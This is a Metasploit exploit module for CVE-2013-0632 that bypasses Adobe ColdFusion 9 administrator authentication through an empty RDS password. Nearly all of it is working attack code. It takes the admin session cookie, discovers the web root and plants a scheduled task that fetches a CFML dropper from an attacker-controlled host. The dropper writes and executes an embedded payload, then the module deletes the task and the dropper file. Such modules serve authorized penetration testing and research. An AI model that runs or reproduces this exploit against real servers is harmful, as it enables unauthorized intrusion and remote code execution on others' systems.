##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  Rank = GreatRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Adobe ColdFusion 9 Administrative Login Bypass',
      'Description'     => %q{
      Adobe ColdFusion 9.0, 9.0.1, 9.0.2, and 10 allows remote attackers to bypass authentication using the RDS component. Its password can
      by default or by misconfiguration be set to an empty value. This allows you to create a session via the RDS login that
      can be carried over to the admin web interface even though the passwords might be different. Therefore bypassing
      authentication on the admin web interface which then could lead to arbitrary code execution.
      Tested on Windows and Linux with ColdFusion 9.
      },
      'Author'          =>
        [
          'Scott Buckel', # Vulnerability discovery
          'Mekanismen <mattias[at]gotroot.eu>' # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ "CVE", "2013-0632" ],
          [ "EDB", "27755" ],
          [ "URL", "http://www.adobe.com/support/security/bulletins/apsb13-03.html" ]
        ],
      'Privileged'      => false,
      'Stance'          => Msf::Exploit::Stance::Aggressive, #thanks juan!
      'Platform'        => ['win', 'linux'],
      'Targets'         =>
        [
         [ 'Windows',
            {
            'Arch' => ARCH_X86,
            'Platform' => 'win'
            }
          ],
          [ 'Linux',
            {
            'Arch' => ARCH_X86,
            'Platform' => 'linux'
            }
          ],
        ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Aug 08 2013'
    ))

    register_options(
      [
        OptString.new('EXTURL', [ false, 'An alternative host to request the CFML payload from', "" ]),
        OptInt.new('HTTPDELAY', [false, 'Time that the HTTP Server will wait for the payload request', 10]),
      ], self.class)

    register_advanced_options(
      [
        OptString.new('CFIDDIR', [ true, 'Alternative CFIDE directory', 'CFIDE'])
      ])
  end

  def check
    uri = target_uri.path

    #can we access the admin interface?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'index.cfm'),
    })

    if res and res.code == 200 and res.body.to_s =~ /ColdFusion Administrator Login/
       print_good "#{peer} - Administrator access available"
    else
      return Exploit::CheckCode::Safe
    end

    #is it cf9?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'images', 'loginbackground.jpg')
    })

    img = Rex::Text.md5(res.body.to_s)
    imghash = "596b3fc4f1a0b818979db1cf94a82220"

    if img == imghash
      print_good "#{peer} - ColdFusion 9 Detected"
    else
      return Exploit::CheckCode::Safe
    end

    #can we access the RDS component?
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'adminapi', 'administrator.cfc'),
      'vars_post' => {
          'method' => "login",
          'adminpassword' => "",
          'rdsPasswordAllowed' => "1"
       }
    })

    if res and res.code == 200 and res.body.to_s =~ /true/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    @pl           = gen_file_dropper
    @payload_url  = ""

    if datastore['EXTURL'].blank?
      begin
        Timeout.timeout(datastore['HTTPDELAY']) {super}
      rescue Timeout::Error
      end
      exec_payload
    else
      @payload_url = datastore['EXTURL']
      upload_payload
      exec_payload
    end
  end

  def primer
    @payload_url = get_uri
    upload_payload
  end

  def on_request_uri(cli, request)
    if request.uri =~ /#{get_resource}/
      send_response(cli, @pl)
    end
  end

  #task scheduler is pretty bad at handling binary files and likes to mess up our meterpreter :-(
  #instead we use a CFML filedropper to embed our payload and execute it.
  #this also removes the dependancy of using the probe.cfm to execute the file.

  def gen_file_dropper
    rand_var    = rand_text_alpha(8+rand(8))
    rand_file   = rand_text_alpha(8+rand(8))

    if datastore['TARGET'] == 0
      rand_file += ".exe"
    end

    encoded_pl  = Rex::Text.encode_base64(generate_payload_exe)

    print_status "Building CFML shell..."
    #embed payload
    shell = ""
    shell += " <cfset #{rand_var} = ToBinary( \"#{encoded_pl}\" ) />"
    shell += " <cffile action=\"write\" output=\"##{rand_var}#\""
    shell += " file= \"#GetDirectoryFromPath(GetCurrentTemplatePath())##{rand_file}\""
    #if linux set correct permissions
    if datastore['TARGET'] == 1
      shell += " mode = \"700\""
    end
    shell += "/>"
    #clean up our evil .cfm
    shell += " <cffile action=\"delete\""
    shell += " file= \"#GetDirectoryFromPath(GetCurrentTemplatePath())##listlast(cgi.script_name,\"/\")#\"/>"
    #execute our payload!
    shell += " <cfexecute"
    shell += " name = \"#GetDirectoryFromPath(GetCurrentTemplatePath())##{rand_file}\""
    shell += " arguments = \"\""
    shell += " timeout = \"60\"/>"

    return shell
  end

  def exec_payload
    uri = target_uri.path

    print_status("#{peer} - Our payload is at: #{peer}\\#{datastore['CFIDDIR']}\\#{@filename}")
    print_status("#{peer} - Executing payload...")

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], @filename)
    })
  end

  def upload_payload
    uri = target_uri.path

    @filename = rand_text_alpha(8+rand(8)) + ".cfm" #numbers is a bad idea
    taskname = rand_text_alpha(8+rand(8)) #numbers is a bad idea

    print_status "#{peer} - Trying to upload payload via scheduled task..."
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'adminapi', 'administrator.cfc'),
      'vars_post' => {
          'method' => "login",
          'adminpassword' => "",
          'rdsPasswordAllowed' => "1"
       }
    })

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - RDS component was unreachable")
    end

    #deal with annoying cookie data prepending (sunglasses)
    cookie = res.get_cookies

    if res and res.code == 200 and cookie =~ /CFAUTHORIZATION_cfadmin=;(.*)/
      cookie = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get auth cookie")
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'index.cfm'),
      'cookie' => cookie
    })

    if res and res.code == 200 and res.body.to_s =~ /ColdFusion Administrator Login/
      print_good("#{peer} - Logged in as Administrator!")
    else
      fail_with(Failure::Unknown, "#{peer} - Login Failed")
    end

    #get file path gogo
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'settings', 'mappings.cfm'),
      'vars_get' => {
        'name' => "/CFIDE"
      },
      'cookie' => cookie
    })

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Mappings URL was unreachable")
    end

    if res.body =~ /<input type="text" maxlength="550" name="directoryPath" value="(.*)" size="40" id="dirpath">/
      file_path = $1
      print_good("#{peer} - File path disclosed! #{file_path}")
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get upload filepath")
    end

    print_status("#{peer} - Adding scheduled task")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'scheduler', 'scheduleedit.cfm'),
      'vars_post' => {
        'TaskName' => taskname,
        'Start_Date' => "Nov 1, 2420",
        'End_Date' => "",
        'Interval' => "",
        'ScheduleType' => "Once",
        'Operation' => "HTTPRequest",
        'ScheduledURL' => @payload_url,
        'publish' => "1",
        'publish_file' => "#{file_path}\\#{@filename}",
        'adminsubmit' => "Submit"
      },
      'cookie' => cookie
    })

    unless res and res.code == 200 or res.code == 302 #302s can happen but it still works, http black magic!
      fail_with(Failure::Unknown, "#{peer} - Scheduled task failed")
    end

    print_status("#{peer} - Running scheduled task")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'scheduler', 'scheduletasks.cfm'),
      'vars_get' => {
        'runtask' => taskname,
        'timeout' => "0"
      },
      'cookie' => cookie
      })

    if res and res.code == 200 and res.body.to_s =~ /This scheduled task was completed successfully/
      print_good("#{peer} - Scheduled task completed successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - Scheduled task failed")
    end

    print_status("#{peer} - Deleting scheduled task")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'scheduler', 'scheduletasks.cfm'),
      'vars_get' => {
        'action' => "delete",
        'task' => taskname
      },
      'cookie' => cookie
    })

    unless res and res.code == 200
      print_error("#{peer} - Scheduled task deletion failed, cleanup might be needed!")
    end
  end
end
